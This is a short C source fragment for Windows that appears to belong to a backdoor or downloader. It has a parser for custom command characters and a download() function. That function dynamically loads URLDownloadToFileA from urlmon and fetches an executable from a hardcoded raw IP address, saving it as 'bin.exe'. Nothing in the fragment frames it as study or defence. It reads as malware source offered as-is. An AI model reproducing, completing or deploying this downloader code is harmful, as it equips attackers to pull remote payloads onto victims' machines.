#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#define str(a) #a
#define xstr(a) str(a)
#define BUFSIZE 9999
#define LOCAL 0

typedef HRESULT (WINAPI *UDTF)(LPVOID, LPCTSTR, LPCTSTR, DWORD, LPVOID);

/*
 * get buf and check if p4p1 custom command
 */
int iscommand(char buf)
{
	if(buf == '*'){
		return 1;
	} else if(buf == '&') {
		return 2;
	} else if(buf == '-'){
		return 3;
	} else {
		return 0;
	}
}

int download()
{
	char * url = "http://86.247.192.29/exe/url.exe";
	char * path = "bin.exe";
	int r = 1;
	HMODULE hDll;
	UDTF URLDownloadToFile;

	if((hDll = LoadLibrary("urlmon"))) {
		if((URLDownloadToFile = (UDTF)GetProcAddress(hDll, "URLDownloadToFileA"))) {
			if(URLDownloadToFile(0, url, path, 0, 0) == 0)
				r = 0;
	}
		FreeLibrary(hDll);
	}

	return r;
}
